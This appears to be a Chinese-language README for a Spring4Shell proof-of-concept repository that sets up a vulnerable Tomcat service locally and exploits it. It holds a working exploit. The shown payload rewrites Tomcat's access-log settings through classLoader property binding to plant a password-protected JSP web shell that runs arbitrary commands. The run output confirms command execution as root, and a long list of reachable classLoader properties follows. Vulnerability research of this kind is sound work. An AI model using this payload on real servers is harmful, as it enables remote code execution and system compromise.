# Spring4Shell-POC

Spring4Shell 漏洞本地复现过程

## 环境准备
* 环境 docker、docker-compose

* mvn 打包，生成  ``./target/ROOT.war`` 
```shell
mvn package
```
* 启动服务
```shell
docker-compose up -d
```

* 关闭服务
```shell
docker-compose down 
```

## 复现过程

* 运行脚本 
```shell
python3 spring-4-shell-exp.py --url "http://127.0.0.1:8080"
```

* 第一次运行

![第一次运行](./screenshots/spring-4-shell-1.png)  

* 第二次运行 


![第二次运行](./screenshots/spring-4-shell-2.png)  

* 执行过程 


```
➜  spring4shell-poc clear             
➜  spring4shell-poc python3 spring-4-shell-exp.py --url "http://127.0.0.1:8080"
The vulnerability exists, the shell address is :http://127.0.0.1:8080/tomcatwar.jsp?pwd=j&cmd=whoami
got response: 
➜  spring4shell-poc clear
➜  spring4shell-poc python3 spring-4-shell-exp.py --url "http://127.0.0.1:8080"
The vulnerability exists, the shell address is :http://127.0.0.1:8080/tomcatwar.jsp?pwd=j&cmd=whoami
got response: root

//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -

➜  spring4shell-poc 

``` 

* docker容器中可以看到在tomcat应用服务中创建了一个jsp文件

![spring-4-shell-web](./screenshots/spring-4-shell-docker.png)


* web也可以直接访问

![spring-4-shell-web](./screenshots/spring-4-shell-web.png)


## 注意点

* spring-4-shell-exp.py 中data的数据
```text
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i 
if ("j".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while ((a = in .read(b)) != -1) {
        out.println(new String(b));
    }
}
%{suffix}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
``` 


* 打印tomcat配置参数
通过 [src/main/webapps/print.jsp](./src/main/webapps/print.jsp) 文件，在运行时可以打印tomcat属性配置

```text
class.classLoader.delegate
class.classLoader.clearReferencesRmiTargets
class.classLoader.clearReferencesStopThreads
class.classLoader.clearReferencesStopTimerThreads
class.classLoader.clearReferencesHttpClientKeepAliveThread
class.classLoader.clearReferencesObjectStreamClassCaches
class.classLoader.clearReferencesThreadLocals
class.classLoader.skipMemoryLeakChecksOnJvmShutdown
class.classLoader.clearReferencesLogFactoryRelease
class.classLoader.defaultAssertionStatus
class.classLoader.resources.allowLinking
class.classLoader.resources.cachingAllowed
class.classLoader.resources.cacheObjectMaxSize
class.classLoader.resources.trackLockedFiles
class.classLoader.resources.domain
class.classLoader.resources.throwOnFailure
class.classLoader.resources.context.delegate
class.classLoader.resources.context.server
class.classLoader.resources.context.useNaming
class.classLoader.resources.context.createUploadTargets
class.classLoader.resources.context.allowMultipleLeadingForwardSlashInPath
class.classLoader.resources.context.requestCharacterEncoding
class.classLoader.resources.context.responseCharacterEncoding
class.classLoader.resources.context.dispatchersUseEncodedPaths
class.classLoader.resources.context.useRelativeRedirects
class.classLoader.resources.context.mapperContextRootRedirectEnabled
class.classLoader.resources.context.mapperDirectoryRedirectEnabled
class.classLoader.resources.context.validateClientProvidedNewSessionId
class.classLoader.resources.context.containerSciFilter
class.classLoader.resources.context.sendRedirectBody
class.classLoader.resources.context.preemptiveAuthentication
class.classLoader.resources.context.fireRequestListenersOnForwards
class.classLoader.resources.context.addWebinfClassesResources
class.classLoader.resources.context.webappVersion
class.classLoader.resources.context.resourceOnlyServlets
class.classLoader.resources.context.effectiveMajorVersion
class.classLoader.resources.context.effectiveMinorVersion
class.classLoader.resources.context.logEffectiveWebXml
class.classLoader.resources.context.allowCasualMultipartParsing
class.classLoader.resources.context.swallowAbortedUploads
class.classLoader.resources.context.publicId
class.classLoader.resources.context.antiResourceLocking
class.classLoader.resources.context.useBloomFilterForArchives
class.classLoader.resources.context.parallelAnnotationScanning
class.classLoader.resources.context.configured
class.classLoader.resources.context.cookies
class.classLoader.resources.context.sessionCookieName
class.classLoader.resources.context.useHttpOnly
class.classLoader.resources.context.sessionCookieDomain
class.classLoader.resources.context.sessionCookiePath
class.classLoader.resources.context.sessionCookiePathUsesTrailingSlash
class.classLoader.resources.context.crossContext
class.classLoader.resources.context.defaultContextXml
class.classLoader.resources.context.defaultWebXml
class.classLoader.resources.context.denyUncoveredHttpMethods
class.classLoader.resources.context.altDDName
class.classLoader.resources.context.displayName
class.classLoader.resources.context.distributable
class.classLoader.resources.context.docBase
class.classLoader.resources.context.j2EEApplication
class.classLoader.resources.context.j2EEServer
class.classLoader.resources.context.ignoreAnnotations
class.classLoader.resources.context.path
class.classLoader.resources.context.originalDocBase
class.classLoader.resources.context.privileged
class.classLoader.resources.context.reloadable
class.classLoader.resources.context.override
class.classLoader.resources.context.replaceWelcomeFiles
class.classLoader.resources.context.sessionTimeout
class.classLoader.resources.context.swallowOutput
class.classLoader.resources.context.unpackWAR
class.classLoader.resources.context.copyXML
class.classLoader.resources.context.wrapperClass
class.classLoader.resources.context.jndiExceptionOnFailedWrite
class.classLoader.resources.context.charsetMapperClass
class.classLoader.resources.context.workDir
class.classLoader.resources.context.clearReferencesRmiTargets
class.classLoader.resources.context.clearReferencesStopThreads
class.classLoader.resources.context.clearReferencesStopTimerThreads
class.classLoader.resources.context.clearReferencesHttpClientKeepAliveThread
class.classLoader.resources.context.renewThreadsWhenStoppingContext
class.classLoader.resources.context.clearReferencesObjectStreamClassCaches
class.classLoader.resources.context.clearReferencesThreadLocals
class.classLoader.resources.context.skipMemoryLeakChecksOnJvmShutdown
class.classLoader.resources.context.xmlNamespaceAware
class.classLoader.resources.context.xmlValidation
class.classLoader.resources.context.xmlBlockExternal
class.classLoader.resources.context.tldValidation
class.classLoader.resources.context.name
class.classLoader.resources.context.startChildren
class.classLoader.resources.context.backgroundProcessorDelay
class.classLoader.resources.context.startStopThreads
class.classLoader.resources.context.domain
class.classLoader.resources.context.throwOnFailure
class.classLoader.resources.context.loader.delegate
class.classLoader.resources.context.loader.reloadable
class.classLoader.resources.context.loader.loaderClass
class.classLoader.resources.context.loader.domain
class.classLoader.resources.context.loader.throwOnFailure
class.classLoader.resources.context.loader.state.declaringClass.module.classLoader.defaultAssertionStatus
class.classLoader.resources.context.loader.state.declaringClass.module.classLoader.platformClassLoader.defaultAssertionStatus
class.classLoader.resources.context.loader.state.declaringClass.module.classLoader.platformClassLoader.systemClassLoader.defaultAssertionStatus
class.classLoader.resources.context.manager.pathname
class.classLoader.resources.context.manager.maxActive
class.classLoader.resources.context.manager.sessionMaxAliveTime
class.classLoader.resources.context.manager.notifyBindingListenerOnUnchangedValue
class.classLoader.resources.context.manager.notifyAttributeListenerOnUnchangedValue
class.classLoader.resources.context.manager.secureRandomClass
class.classLoader.resources.context.manager.secureRandomAlgorithm
class.classLoader.resources.context.manager.secureRandomProvider
class.classLoader.resources.context.manager.sessionAttributeNameFilter
class.classLoader.resources.context.manager.sessionAttributeValueClassNameFilter
class.classLoader.resources.context.manager.warnOnSessionAttributeFilterFailure
class.classLoader.resources.context.manager.processExpiresFrequency
class.classLoader.resources.context.manager.persistAuthentication
class.classLoader.resources.context.manager.duplicates
class.classLoader.resources.context.manager.maxActiveSessions
class.classLoader.resources.context.manager.domain
class.classLoader.resources.context.manager.throwOnFailure
class.classLoader.resources.context.manager.sessionIdGenerator.jvmRoute
class.classLoader.resources.context.manager.sessionIdGenerator.sessionIdLength
class.classLoader.resources.context.manager.sessionIdGenerator.secureRandomClass
class.classLoader.resources.context.manager.sessionIdGenerator.secureRandomAlgorithm
class.classLoader.resources.context.manager.sessionIdGenerator.secureRandomProvider
class.classLoader.resources.context.manager.sessionIdGenerator.throwOnFailure
class.classLoader.resources.context.manager.engine.defaultHost
class.classLoader.resources.context.manager.engine.jvmRoute
class.classLoader.resources.context.manager.engine.name
class.classLoader.resources.context.manager.engine.startChildren
class.classLoader.resources.context.manager.engine.backgroundProcessorDelay
class.classLoader.resources.context.manager.engine.startStopThreads
class.classLoader.resources.context.manager.engine.domain
class.classLoader.resources.context.manager.engine.throwOnFailure
class.classLoader.resources.context.manager.engine.catalinaHome.writable
class.classLoader.resources.context.manager.engine.catalinaHome.readable
class.classLoader.resources.context.manager.engine.catalinaHome.executable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.writable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.readable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.executable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.writable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.readable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.executable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.parentFile.writable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.parentFile.readable
class.classLoader.resources.context.manager.engine.catalinaHome.parentFile.parentFile.parentFile.executable
class.classLoader.resources.context.manager.engine.realm.failureCount
class.classLoader.resources.context.manager.engine.realm.lockOutTime
class.classLoader.resources.context.manager.engine.realm.cacheSize
class.classLoader.resources.context.manager.engine.realm.cacheRemovalWarningTime
class.classLoader.resources.context.manager.engine.realm.realmPath
class.classLoader.resources.context.manager.engine.realm.transportGuaranteeRedirectStatus
class.classLoader.resources.context.manager.engine.realm.allRolesMode
class.classLoader.resources.context.manager.engine.realm.validate
class.classLoader.resources.context.manager.engine.realm.x509UsernameRetrieverClassName
class.classLoader.resources.context.manager.engine.realm.stripRealmForGss
class.classLoader.resources.context.manager.engine.realm.domain
class.classLoader.resources.context.manager.engine.realm.throwOnFailure
class.classLoader.resources.context.manager.engine.realm.credentialHandler.encoding
class.classLoader.resources.context.manager.engine.realm.credentialHandler.algorithm
class.classLoader.resources.context.manager.engine.realm.credentialHandler.iterations
class.classLoader.resources.context.manager.engine.realm.credentialHandler.saltLength
class.classLoader.resources.context.manager.engine.realm.credentialHandler.logInvalidStoredCredentials
class.classLoader.resources.context.manager.engine.service.name
class.classLoader.resources.context.manager.engine.service.domain
class.classLoader.resources.context.manager.engine.service.throwOnFailure
class.classLoader.resources.context.manager.engine.service.server.portOffset
class.classLoader.resources.context.manager.engine.service.server.port
class.classLoader.resources.context.manager.engine.service.server.address
class.classLoader.resources.context.manager.engine.service.server.shutdown
class.classLoader.resources.context.manager.engine.service.server.utilityThreads
class.classLoader.resources.context.manager.engine.service.server.utilityThreadsAsDaemon
class.classLoader.resources.context.manager.engine.service.server.periodicEventDelay
class.classLoader.resources.context.manager.engine.service.server.domain
class.classLoader.resources.context.manager.engine.service.server.throwOnFailure
class.classLoader.resources.context.manager.engine.service.server.globalNamingResources.domain
class.classLoader.resources.context.manager.engine.service.server.globalNamingResources.throwOnFailure
class.classLoader.resources.context.manager.engine.service.server.globalNamingContext.exceptionOnFailedWrite
class.classLoader.resources.context.manager.engine.service.server.catalina.await
class.classLoader.resources.context.manager.engine.service.server.catalina.useShutdownHook
class.classLoader.resources.context.manager.engine.service.server.catalina.configFile
class.classLoader.resources.context.manager.engine.service.server.catalina.generateCode
class.classLoader.resources.context.manager.engine.service.server.catalina.useGeneratedCode
class.classLoader.resources.context.manager.engine.service.server.catalina.generatedCodePackage
class.classLoader.resources.context.manager.engine.service.server.catalina.useNaming
class.classLoader.resources.context.manager.engine.service.mapper.defaultHostName
class.classLoader.resources.context.manager.engine.pipeline.throwOnFailure
class.classLoader.resources.context.manager.engine.pipeline.first.asyncSupported
class.classLoader.resources.context.manager.engine.pipeline.first.domain
class.classLoader.resources.context.manager.engine.pipeline.first.throwOnFailure
class.classLoader.resources.context.cookieProcessor.sameSiteCookies
class.classLoader.resources.context.authenticator.cache
class.classLoader.resources.context.authenticator.allowCorsPreflight
class.classLoader.resources.context.authenticator.alwaysUseSession
class.classLoader.resources.context.authenticator.disableProxyCaching
class.classLoader.resources.context.authenticator.securePagesWithPragma
class.classLoader.resources.context.authenticator.changeSessionIdOnAuthentication
class.classLoader.resources.context.authenticator.secureRandomClass
class.classLoader.resources.context.authenticator.secureRandomAlgorithm
class.classLoader.resources.context.authenticator.secureRandomProvider
class.classLoader.resources.context.authenticator.jaspicCallbackHandlerClass
class.classLoader.resources.context.authenticator.sendAuthInfoResponseHeaders
class.classLoader.resources.context.authenticator.asyncSupported
class.classLoader.resources.context.authenticator.domain
class.classLoader.resources.context.authenticator.throwOnFailure
class.classLoader.resources.context.authenticator.next.asyncSupported
class.classLoader.resources.context.authenticator.next.domain
class.classLoader.resources.context.authenticator.next.throwOnFailure
class.classLoader.resources.context.jarScanner.scanClassPath
class.classLoader.resources.context.jarScanner.scanManifest
class.classLoader.resources.context.jarScanner.scanAllFiles
class.classLoader.resources.context.jarScanner.scanAllDirectories
class.classLoader.resources.context.jarScanner.scanBootstrapClassPath
class.classLoader.resources.context.jarScanner.jarScanFilter.tldSkip
class.classLoader.resources.context.jarScanner.jarScanFilter.tldScan
class.classLoader.resources.context.jarScanner.jarScanFilter.defaultTldScan
class.classLoader.resources.context.jarScanner.jarScanFilter.pluggabilitySkip
class.classLoader.resources.context.jarScanner.jarScanFilter.pluggabilityScan
class.classLoader.resources.context.jarScanner.jarScanFilter.defaultPluggabilityScan
class.classLoader.resources.context.loginConfig.loginPage
class.classLoader.resources.context.loginConfig.errorPage
class.classLoader.resources.context.loginConfig.authMethod
class.classLoader.resources.context.loginConfig.realmName
class.classLoader.resources.context.namingResources.domain
class.classLoader.resources.context.namingResources.throwOnFailure
class.classLoader.resources.context.servletContext.requestCharacterEncoding
class.classLoader.resources.context.servletContext.responseCharacterEncoding
class.classLoader.resources.context.servletContext.sessionTimeout
class.classLoader.resources.context.servletContext.servletNames.class.enclosingMethod.accessible
class.classLoader.resources.context.servletContext.sessionCookieConfig.name
class.classLoader.resources.context.servletContext.sessionCookieConfig.comment
class.classLoader.resources.context.servletContext.sessionCookieConfig.maxAge
class.classLoader.resources.context.servletContext.sessionCookieConfig.path
class.classLoader.resources.context.servletContext.sessionCookieConfig.secure
class.classLoader.resources.context.servletContext.sessionCookieConfig.domain
class.classLoader.resources.context.servletContext.sessionCookieConfig.httpOnly
class.classLoader.resources.context.namingContextListener.name
class.classLoader.resources.context.namingContextListener.exceptionOnFailedWrite
class.classLoader.resources.context.namingContextListener.envContext.exceptionOnFailedWrite
class.classLoader.resources.context.parent.name
class.classLoader.resources.context.parent.copyXML
class.classLoader.resources.context.parent.workDir
class.classLoader.resources.context.parent.failCtxIfServletStartFails
class.classLoader.resources.context.parent.undeployOldVersions
class.classLoader.resources.context.parent.appBase
class.classLoader.resources.context.parent.xmlBase
class.classLoader.resources.context.parent.createDirs
class.classLoader.resources.context.parent.autoDeploy
class.classLoader.resources.context.parent.configClass
class.classLoader.resources.context.parent.contextClass
class.classLoader.resources.context.parent.deployOnStartup
class.classLoader.resources.context.parent.deployXML
class.classLoader.resources.context.parent.errorReportValveClass
class.classLoader.resources.context.parent.unpackWARs
class.classLoader.resources.context.parent.deployIgnore
class.classLoader.resources.context.parent.startChildren
class.classLoader.resources.context.parent.backgroundProcessorDelay
class.classLoader.resources.context.parent.startStopThreads
class.classLoader.resources.context.parent.domain
class.classLoader.resources.context.parent.throwOnFailure
class.classLoader.resources.context.parent.appBaseFile.writable
class.classLoader.resources.context.parent.appBaseFile.readable
class.classLoader.resources.context.parent.appBaseFile.executable
class.classLoader.resources.context.parent.configBaseFile.writable
class.classLoader.resources.context.parent.configBaseFile.readable
class.classLoader.resources.context.parent.configBaseFile.executable
class.classLoader.resources.context.parent.configBaseFile.parentFile.writable
class.classLoader.resources.context.parent.configBaseFile.parentFile.readable
class.classLoader.resources.context.parent.configBaseFile.parentFile.executable
class.classLoader.resources.context.parent.configBaseFile.parentFile.parentFile.writable
class.classLoader.resources.context.parent.configBaseFile.parentFile.parentFile.readable
class.classLoader.resources.context.parent.configBaseFile.parentFile.parentFile.executable
class.classLoader.resources.context.parent.pipeline.throwOnFailure
class.classLoader.resources.context.parent.pipeline.first.encoding
class.classLoader.resources.context.parent.pipeline.first.prefix
class.classLoader.resources.context.parent.pipeline.first.maxDays
class.classLoader.resources.context.parent.pipeline.first.directory
class.classLoader.resources.context.parent.pipeline.first.checkExists
class.classLoader.resources.context.parent.pipeline.first.rotatable
class.classLoader.resources.context.parent.pipeline.first.renameOnRotate
class.classLoader.resources.context.parent.pipeline.first.buffered
class.classLoader.resources.context.parent.pipeline.first.suffix
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat
class.classLoader.resources.context.parent.pipeline.first.locale
class.classLoader.resources.context.parent.pipeline.first.requestAttributesEnabled
class.classLoader.resources.context.parent.pipeline.first.enabled
class.classLoader.resources.context.parent.pipeline.first.maxLogMessageBufferSize
class.classLoader.resources.context.parent.pipeline.first.ipv6Canonical
class.classLoader.resources.context.parent.pipeline.first.pattern
class.classLoader.resources.context.parent.pipeline.first.condition
class.classLoader.resources.context.parent.pipeline.first.conditionUnless
class.classLoader.resources.context.parent.pipeline.first.conditionIf
class.classLoader.resources.context.parent.pipeline.first.asyncSupported
class.classLoader.resources.context.parent.pipeline.first.domain
class.classLoader.resources.context.parent.pipeline.first.throwOnFailure
class.classLoader.resources.context.parent.pipeline.first.next.showReport
class.classLoader.resources.context.parent.pipeline.first.next.showServerInfo
class.classLoader.resources.context.parent.pipeline.first.next.asyncSupported
class.classLoader.resources.context.parent.pipeline.first.next.domain
class.classLoader.resources.context.parent.pipeline.first.next.throwOnFailure
class.classLoader.resources.context.parent.pipeline.first.next.next.asyncSupported
class.classLoader.resources.context.parent.pipeline.first.next.next.domain
class.classLoader.resources.context.parent.pipeline.first.next.next.throwOnFailure
class.classLoader.resources.context.parent.accessLog.requestAttributesEnabled
class.classLoader.resources.context.pipeline.throwOnFailure
```


### 参考 

* https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities
* https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
* https://github.com/liudonghua123/spring-core-rce
